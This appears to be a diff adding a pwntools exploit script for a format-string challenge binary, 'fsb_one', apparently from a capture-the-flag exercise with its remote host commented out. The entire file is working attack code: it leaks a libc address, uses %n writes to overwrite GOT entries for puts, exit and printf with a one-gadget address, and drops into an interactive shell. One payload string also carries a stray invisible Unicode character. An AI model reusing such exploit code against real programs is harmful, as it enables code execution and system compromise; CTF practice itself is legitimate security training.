@@ -1,0 +1,68 @@
+from pwn import *
+fsb=ELF('./fsb_one')
+
+auth='<deleted>'
+
+
+#sleep(5)
+#sh=remote("10.214.10.18",18422)
+#sh.sendline(auth)
+
+sh=process('./fsb_one')
+sh.recvrepeat(timeout = 1)
+
+puts_got = fsb.got['puts']
+printf_got = fsb.got['printf']
+setvbuf_got = fsb.got['setvbuf']
+ext_got = fsb.got['exit']
+
+payload ='%999999c%999999c%999999c%999999c%196748‬c'
+payload +='%13$lln'
+payload +='A'*(7*8-len(payload))
+payload += p64(puts_got)
+print(payload)
+sh.sendline(payload)
+
+
+p1='AAAA%7$s'+p64(setvbuf_got)
+sh.sendline(p1)
+ret1=sh.recv(timeout = 1)
+ret1=ret1[4:ret1.find('\n')-3]
+setvbuf_addr=u64(ret1+'\0'*(8-len(ret1)))
+print setvbuf_addr
+
+#puts_offset = 0x06f690 #https://libc.blukat.me/?q=puts%3A690&l=libc6_2.23-0ubuntu10_amd64
+#gadget_offset = 0x45216
+#setvbuf_offset = 0x6fe70
+
+puts_offset = 0x071910
+gadget_offset = 0x4484f
+setvbuf_offset = 0x71F90
+
+gadget_addr = setvbuf_addr - setvbuf_offset + gadget_offset
+
+for i in range(8):
+    payload =''
+    if(ord(p64(gadget_addr)[i])!=0):
+        payload ='%'+str(ord(p64(gadget_addr)[i]))+'c'
+    payload +='%9$hhn'
+    payload +='A'*(24-len(payload))
+    payload += p64(ext_got+i)
+    print(payload)
+    sh.sendline(payload)
+
+payload ='%999999c%999999c%999999c%999999c%196084c'
+payload +='%13$lln'
+payload +='A'*(7*8-len(payload))
+payload += p64(printf_got)
+print(payload)
+sh.sendline(payload)
+
+sh.sendline('\x00')
+
+sh.interactive()
+
+
+
+##################################################################
+
